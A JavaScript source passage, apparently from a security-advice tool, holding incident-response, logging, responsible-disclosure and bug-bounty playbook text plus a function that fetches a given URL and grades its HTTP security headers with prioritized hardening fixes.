    bug_bounty_launch: 'BUG BOUNTY LAUNCH PLAYBOOK — the honest sequencing: a bounty program BEFORE basic hardening is paying strangers to list the bugs you already know about. Prerequisites: pentest done + criticals fixed, authz regression suite running, on-call triage capacity (first-week volume is real). Then: (1) start with a VDP (vulnerability disclosure policy — the disclosure_policy below + security.txt): legal safe harbor, no payment, costs nothing, catches the drive-by reports; (2) private bounty next (invite 10-30 researchers via HackerOne/Bugcrowd/Intigriti private program) — tune scope, payouts and triage muscles without public flood; (3) public only when triage is boring; (4) scope tightly (prod app + API; exclude marketing WordPress, social engineering, DoS, and recently-acquired anything until hardened); (5) payout bands honest for your size ($100-250 low / $500-1500 high / $2500+ critical gets indie-scale attention; underpaying generates public complaints that cost more than the delta); (6) triage SLA: first response 48h, triage 5 days, bounty on validation not on fix — researchers remember respect and return with their best bugs (or take them elsewhere).'
  };

  return {
    status: 'success',
    context_assessment: `IR/audit preparation for: "${ctx}" — driver: ${driver.replace(/_/g, ' ')}.`,
    driver_playbook: playbooks[driver],
    logging_detection_plan: 'LOGGING & DETECTION BASELINE (one day to ship, years of regret prevented): LOG these with user/IP/timestamp/request-id — auth events (login success AND failure, resets, MFA changes, OAuth grants), authorization DENIALS (403s per user are your IDOR-hunter alarm), admin/privileged actions (every one), data egress events (exports, bulk reads, report downloads), and money mutations. NEVER log: passwords, tokens, full card numbers, session IDs (log a hash prefix if correlation is needed). ALERT on (start with exactly these five): (1) failed-login burst per IP/account (stuffing), (2) authz-denial burst per account (enumeration probing), (3) admin action from new device/geo, (4) export volume anomaly vs account baseline, (5) any use of a canary token. RETAIN: 90 days hot, 1 year cold minimum (median breach discovery is months — logs you deleted are breaches you cannot scope, and your insurer/auditor has opinions here). Structured JSON logs into anything queryable (CloudWatch/Loki/ClickHouse) — grep-ability in anger is the actual requirement.',
    incident_runbook: [
      { step: '0. BEFORE: the one-pager exists', detail: 'Severity definitions, IC rotation (two names + phone numbers), counsel + insurer contacts, log locations, kill-switch list (how to revoke all sessions / disable signups / block an IP in under 5 minutes — tested, not theoretical). A tabletop run once (1 hour, pick "leaked AWS key" as the scenario) converts the doc from prose to muscle memory.' },
      { step: '1. DETECT & DECLARE', detail: 'Whoever sees it declares in #incident channel — declaring a false alarm costs 20 minutes; not declaring a real one costs the company. Timestamp everything from this moment (scribe role).' },
      { step: '2. TRIAGE SEVERITY', detail: 'SEV1: confirmed data access / money moving / prod fully down → all-hands, counsel, insurer. SEV2: credible suspicion → IC + one responder investigate before escalating. SEV3: hygiene finding → ticket, not incident.' },
      { step: '3. CONTAIN', detail: 'Stop ongoing damage with the smallest effective hammer: rotate the credential, kill the sessions, disable the account, isolate the service. Preserve evidence where containment destroys it (snapshot before terminating instances).' },
      { step: '4. SCOPE FROM LOGS', detail: 'Entry vector, time window (commit time not discovery time for leaks), accessed resources, affected users. This answer — not vibes — determines notification duties and the comms plan.' },
      { step: '5. ERADICATE & RECOVER', detail: 'Close the hole AND its siblings (one IDOR = audit all endpoints; one leaked key = scan all history), restore from known-good state, verify with the detection that now exists for this class.' },
      { step: '6. NOTIFY AS REQUIRED', detail: 'With counsel: regulators (GDPR 72h clock from awareness of a personal-data breach), affected users (plain language: what, when, what we did, what they should do), insurer (early — late notice risks coverage). One spokesperson, facts only.' },
      { step: '7. POSTMORTEM (blameless, within 7 days)', detail: 'Timeline, root cause (the system, not the person), class-level fixes with owners and dates, and the new alert that catches this in minutes next time. Publish internally — incidents hidden are incidents repeated.' }
    ],
    disclosure_policy: 'RESPONSIBLE DISCLOSURE SETUP (an afternoon of work that recruits free security researchers): (1) /.well-known/security.txt — Contact: security@yourdomain, Policy: link, Preferred-Languages, Expires (the RFC 9116 standard place researchers check first); (2) a disclosure page stating: scope (domains in/out), safe harbor ("good-faith research within this policy will not trigger legal action" — without this sentence, serious researchers skip you), what is out of bounds (DoS, social engineering, physical, data exfiltration beyond proof-of-concept), how to report (email or form, PGP key optional-but-appreciated), and response expectations (ack 48h, triage 5 business days, fix timeline communicated); (3) internally: security@ routes to a human with authority to act, reports get ticketed like SEV2s until triaged, and reporters get thanked + updated (a public hall-of-fame page costs nothing and doubles report quality). The pattern to avoid: legal-threatening a researcher — it reliably goes viral and becomes the most expensive email the company ever sent.',
    readiness_checklist: [
      '1. IR one-pager exists: severities, IC names + phones, counsel/insurer contacts, log locations, kill-switch list.',
      '2. One tabletop exercise run and logged (scenario: leaked cloud key or auth bypass).',
      '3. Logging baseline live: auth events, denials, admin actions, exports — queryable, 90d/1y retention.',
      '4. The five starter alerts firing into a channel humans actually read.',
      '5. Kill switches tested: revoke-all-sessions, disable-signups, block-IP, rotate-primary-keys — each under 5 minutes.',
      '6. security.txt + disclosure page live with safe harbor language.',
      '7. Backups restore-TESTED this quarter (a backup never restored is a hope, not a control).',
      '8. Access review done: offboarded humans fully out (the #1 audit finding), MFA on everything privileged.',
      '9. Vendor list with data-access classification (who could leak YOUR customer data).',
      '10. Driver-specific artifact complete: SOC2 evidence automation / pentest scope doc / bounty policy page — per the playbook above.'
    ]
  };
}

async function auditSecurityHeadersLive(args) {
  let url = String(args.url).trim();
  if (!/^https?:\/\//i.test(url)) url = 'https://' + url;

  let resp = null;
  let fetchError = null;
  try {
    resp = await fetch(url, {
      redirect: 'follow',
      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SecForge-MCP/1.1; +https://mcp-hub.agentweb-hub.workers.dev/mcp/secforge)' }
    });
  } catch (e) {
    fetchError = e.message;
  }

  if (fetchError || !resp) {
    const note = 'Live fetch failed for ' + url + ' (' + (fetchError || 'no response') + '). The site may block automated requests, be offline, or the URL may be wrong. Retry, verify the URL, or audit a specific page. The strategy tool configure_security_headers_csp works offline meanwhile.';
    return { status: 'success', security_grade: 'UNGRADED \u2014 target unreachable', headers_found: note, missing_critical: note, hardening_priorities: note, data_source: 'Live HTTP fetch (failed) \u2014 target: ' + url };
  }

  const h = resp.headers;
  function get(name) { return h.get(name); }

  const found = [];
  const missing = [];
  const fixes = [];
  let score = 0;

  const hsts = get('strict-transport-security');
  if (hsts) {
    const maxAge = (hsts.match(/max-age=(\d+)/i) || [])[1];
    const strong = maxAge && Number(maxAge) >= 15552000;
    found.push('Strict-Transport-Security: "' + hsts.slice(0, 80) + '"' + (strong ? ' (strong)' : ' (max-age below the 6-month recommendation)'));
    score += strong ? 20 : 12;
    if (!strong) fixes.push('P2 \u2014 HSTS max-age is short: set max-age=31536000; includeSubDomains (preload once confident)');
  } else {
    missing.push('Strict-Transport-Security \u2014 without HSTS, first visits and downgrade attacks can ride plain HTTP; one header eliminates the class');
    fixes.push('P1 \u2014 ADD HSTS: Strict-Transport-Security: max-age=31536000; includeSubDomains');
  }

  const csp = get('content-security-policy');
  if (csp) {
    const unsafe = /unsafe-inline|unsafe-eval/i.test(csp);
    const wildcardDefault = /default-src[^;]*\*/i.test(csp);
    found.push('Content-Security-Policy: present, ' + csp.length + ' chars' + (unsafe ? ' (contains unsafe-inline/unsafe-eval \u2014 weakens XSS protection substantially)' : ' (no unsafe- keywords detected)') + (wildcardDefault ? ' (wildcard default-src \u2014 near-useless)' : ''));
    score += unsafe || wildcardDefault ? 12 : 25;
    if (unsafe) fixes.push('P2 \u2014 CSP CONTAINS unsafe-inline/unsafe-eval: migrate to nonces or hashes; unsafe-inline is the XSS hole CSP exists to close');
    if (wildcardDefault) fixes.push('P2 \u2014 CSP wildcard default-src: enumerate real origins; a wildcard policy is decoration');
  } else {
    missing.push('Content-Security-Policy \u2014 the single most powerful XSS mitigation; its absence means any injected script runs unrestricted');
    fixes.push('P1 \u2014 ADD CSP: start with Content-Security-Policy-Report-Only to inventory sources, then enforce default-src \u0027self\u0027 plus explicit origins');
  }

  const xcto = get('x-content-type-options');
  if (xcto && /nosniff/i.test(xcto)) { found.push('X-Content-Type-Options: nosniff'); score += 10; }
  else { missing.push('X-Content-Type-Options: nosniff \u2014 prevents MIME-sniffing attacks; zero-cost header'); fixes.push('P1 \u2014 ADD X-Content-Type-Options: nosniff (one line, no side effects)'); }

  const xfo = get('x-frame-options');
  const cspFrame = csp && /frame-ancestors/i.test(csp);
  if (xfo || cspFrame) { found.push(xfo ? 'X-Frame-Options: ' + xfo : 'frame-ancestors via CSP (modern equivalent of X-Frame-Options)'); score += 10; }
  else { missing.push('X-Frame-Options / frame-ancestors \u2014 without it the site can be iframed for clickjacking'); fixes.push('P2 \u2014 ADD clickjacking protection: CSP frame-ancestors \u0027self\u0027 (or X-Frame-Options: DENY for legacy)'); }

  const refpol = get('referrer-policy');
  if (refpol) { found.push('Referrer-Policy: ' + refpol); score += 8; }
  else { missing.push('Referrer-Policy \u2014 full URLs leak to third parties in the Referer header by default'); fixes.push('P3 \u2014 ADD Referrer-Policy: strict-origin-when-cross-origin'); }

  const permpol = get('permissions-policy');
  if (permpol) { found.push('Permissions-Policy: present (' + permpol.slice(0, 60) + '...)'); score += 7; }
  else { missing.push('Permissions-Policy \u2014 browser features (camera, mic, geolocation) remain available to any script'); fixes.push('P3 \u2014 ADD Permissions-Policy denying unused features: camera=(), microphone=(), geolocation=()'); }

  const setCookie = get('set-cookie');
  if (setCookie) {
    const hasSecure = /;\s*secure/i.test(setCookie);
    const hasHttpOnly = /;\s*httponly/i.test(setCookie);
    const hasSameSite = /;\s*samesite/i.test(setCookie);
    const flags = [hasSecure ? 'Secure \u2705' : 'Secure \u274c', hasHttpOnly ? 'HttpOnly \u2705' : 'HttpOnly \u274c', hasSameSite ? 'SameSite \u2705' : 'SameSite \u274c'];
    found.push('Set-Cookie flags on this response: ' + flags.join(', '));
    score += (hasSecure ? 4 : 0) + (hasHttpOnly ? 3 : 0) + (hasSameSite ? 3 : 0);
    if (!hasSecure || !hasHttpOnly || !hasSameSite) fixes.push('P2 \u2014 COOKIE FLAGS INCOMPLETE on this response: session cookies need Secure; HttpOnly; SameSite=Lax (or Strict)');
  } else {
    score += 10;
  }

  const leaks = [];
  const server = get('server');
  const powered = get('x-powered-by');
  if (server && /[\d.]/.test(server)) leaks.push('Server: "' + server + '" exposes version info');
  if (powered) leaks.push('X-Powered-By: "' + powered + '" exposes the stack');
  if (leaks.length > 0) fixes.push('P3 \u2014 INFORMATION LEAKAGE: ' + leaks.join('; ') + ' \u2014 strip or genericize; version strings are free recon for attackers');
  else score += 10;

  const acao = get('access-control-allow-origin');
  if (acao === '*' && get('access-control-allow-credentials') === 'true') {
    fixes.push('P1 \u2014 CORS MISCONFIGURATION: wildcard origin WITH credentials is a cross-origin data-theft hole; enumerate allowed origins');
  } else if (acao) {
    found.push('Access-Control-Allow-Origin: ' + acao + (acao === '*' ? ' (wildcard \u2014 fine for public read-only APIs, dangerous with credentials or private data)' : ''));
  }

  const grade = score >= 85 ? 'A' : (score >= 70 ? 'B' : (score >= 50 ? 'C' : (score >= 30 ? 'D' : 'F')));
  if (fixes.length === 0) fixes.push('CLEAN POSTURE: all core headers present and sane \u2014 next level is CSP tightening (nonce-based), HSTS preload submission, and quarterly re-audits');

  return {
    status: 'success',
    security_grade: 'LIVE SECURITY GRADE for ' + url + ': ' + grade + ' (' + Math.min(score, 100) + '/100). HTTP status: ' + resp.status + '. Graded on the headers the server actually sent to this request \u2014 the same surface every attacker sees first.',
    headers_found: found.length > 0 ? 'SECURITY HEADERS PRESENT (' + found.length + '): ' + found.join('. ') + '.' : 'NO SECURITY HEADERS DETECTED \u2014 the response carries none of the standard protections.',
    missing_critical: missing.length > 0 ? 'MISSING PROTECTIONS (' + missing.length + '): ' + missing.join('. ') + '.' : 'No critical headers missing \u2014 the core protection set is deployed.',
    hardening_priorities: 'PRIORITIZED HARDENING LIST (P1 = do today): ' + fixes.map(function(f, i) { return (i + 1) + '. ' + f; }).join('. ') + '. Re-run this audit after deploying each change.',
    data_source: 'Live HTTP fetch (real time) \u2014 ' + url + ' responded ' + resp.status + '; headers analyzed from the actual response at the moment of this request.'
  };
}
